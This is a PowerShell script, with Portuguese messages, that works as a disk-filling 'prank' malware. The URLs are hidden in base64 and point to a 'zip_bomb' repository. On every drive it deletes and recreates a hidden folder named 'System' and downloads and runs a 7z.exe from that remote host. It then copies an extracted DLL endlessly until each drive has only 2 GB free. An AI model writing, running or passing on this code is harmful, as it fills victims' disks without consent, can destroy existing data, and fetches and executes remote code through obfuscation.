$SevenZipUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thdGNodXBhLXNhYmkvcG93ZXJzaGVsbF9wcmFua3MvcmVmcy9oZWFkcy9tYWluL3ppcF9ib21iLzd6LmV4ZT9kbD0x"
$ZipUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thdGNodXBhLXNhYmkvcG93ZXJzaGVsbF9wcmFua3MvcmVmcy9oZWFkcy9tYWluL3ppcF9ib21iL2ZpbGUuemlwP2RsPTE="

$NomePasta   = "System"
$MinFreeGB   = 2

foreach ($Drive in Get-PSDrive -PSProvider FileSystem) {
    if ($null -eq $Drive.Free) {
        continue
    }
    $Root = $Drive.Root
    $Destination = Join-Path $Root $NomePasta
    $SevenZip = Join-Path $Destination "7z.exe"
    $RootZip = Join-Path $Destination "file.zip"

    Write-Host "`nProcessando disco: $Root"

    try {
        if (Test-Path $Destination) {
            Remove-Item $Destination -Recurse -Force -ErrorAction SilentlyContinue
        }

        New-Item -ItemType Directory -Path $Destination -Force | Out-Null
        attrib +h $Destination

        Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ZipUrl))) -OutFile $RootZip
        Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($SevenZipUrl))) -OutFile $SevenZip

        Write-Host "Extraindo zip em $Destination"

        & $SevenZip e "$RootZip" "-o$Destination" -y | Out-Null

        Remove-Item $RootZip -Force -ErrorAction SilentlyContinue

        $SourceFile = Join-Path $Destination "file.dll"

        if (-not (Test-Path $SourceFile)) {
            Write-Warning "file.dll não encontrado em $Destination"
            continue
        }

        $i = 0

        while ($i -gt -1) {
            $CurrentDrive = Get-PSDrive -Name $Drive.Name
            $FreeGB = [math]::Round($CurrentDrive.Free / 1GB, 2)

            if ($FreeGB -le $MinFreeGB) {
                Write-Host "Parado em $Root : espaço livre mínimo atingido ($FreeGB GB)."
                break
            }

            $TargetFile = Join-Path $Destination "$i.dll"

            if (-not (Test-Path $TargetFile)) {
                Copy-Item $SourceFile $TargetFile -Force -ErrorAction SilentlyContinue
            }

            $i++

            if ($i % 1000 -eq 0) {
                Write-Host "$Root : $i ficheiros criados | Livre: $FreeGB GB"
            }
        }

        Write-Host "Resultado em $Root : $i ficheiros criados."
    }
    catch {
        Write-Warning "Erro no disco $Root : $($_.Exception.Message)"
    }
}